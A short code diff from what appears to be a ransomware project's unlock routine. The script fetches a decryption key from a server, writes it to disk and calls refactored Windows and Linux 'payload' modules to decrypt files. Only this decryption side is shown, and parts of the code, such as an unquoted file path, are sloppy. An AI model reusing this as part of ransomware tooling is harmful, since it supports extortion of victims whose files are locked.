@@ -1,9 +1,7 @@
 import requests
 import os,platform,subprocess,re
-import aes_decryption_for_linux as aesl
-import aes_decryption_for_windows as aesw
-import windows_payload as win
-import linux_payload as linux
+import windows.decryption_payload_win as windows
+import linux.linux_decrypting_payload as linux
 cipher_text = open('res/key.txt.y4h','rb').read()
 cipher = cipher_text.decode()
 del cipher_text
@@ -30,14 +28,8 @@ while(True):
     else:
         open('res/key.txt','wb').write(res['keys'])
         if(method == 1):
-            onlyfiles=win.find_file(2)
-	    for file in onlyfiles:
-		aesw.aes_decrypt(file,2)
-	    os.remove(res/key.txt)
+            windows.decrypt_win()
 	    break
         elif(method == 2):
-            onlyfiles = linux.d_main(2)
-            for file in onlyfiles:
-                aesl.aes_decrypt(file,1)
-            os.remove('res/key.txt')
-            break
+            linux.decrypt_lin()
+	    break
